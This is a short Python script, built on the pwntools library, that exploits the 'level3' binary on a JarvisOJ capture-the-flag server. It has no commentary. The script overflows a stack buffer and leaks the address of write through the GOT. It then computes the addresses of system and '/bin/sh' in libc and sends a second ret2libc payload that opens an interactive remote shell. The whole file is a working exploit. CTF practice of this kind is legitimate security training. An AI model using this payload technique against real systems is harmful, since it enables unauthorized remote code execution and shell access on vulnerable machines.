#!usr/bin/env python
# encoding:utf-8
from pwn import *

#io = process("./level3")
io = remote("pwn2.jarvisoj.com",9879)
elf = ELF("./level3")

writeplt = elf.plt["write"]
writegot = elf.got["write"]
func = elf.symbols["vulnerable_function"]

libc = ELF("./libc-2.19.so")
writelibc = libc.symbols["write"]
syslibc = libc.symbols["system"]
binlibc = libc.search("/bin/sh").next()

payload1 = 'a' * 0x88 + 'f**k' + p32(writeplt) + p32(func) + p32(1)+p32(writegot)+p32(4)

io.recvuntil("Input:\n")
io.sendline(payload1)

writeaddr = u32(io.recv(4))
sysaddr = writeaddr - writelibc + syslibc
binaddr = writeaddr - writelibc + binlibc

payload2 = 'a' * 0x88 + 'f**k' + p32(sysaddr) + p32(func) + p32(binaddr)
io.recvuntil("Input:\n")
io.sendline(payload2)
io.interactive()
io.close()


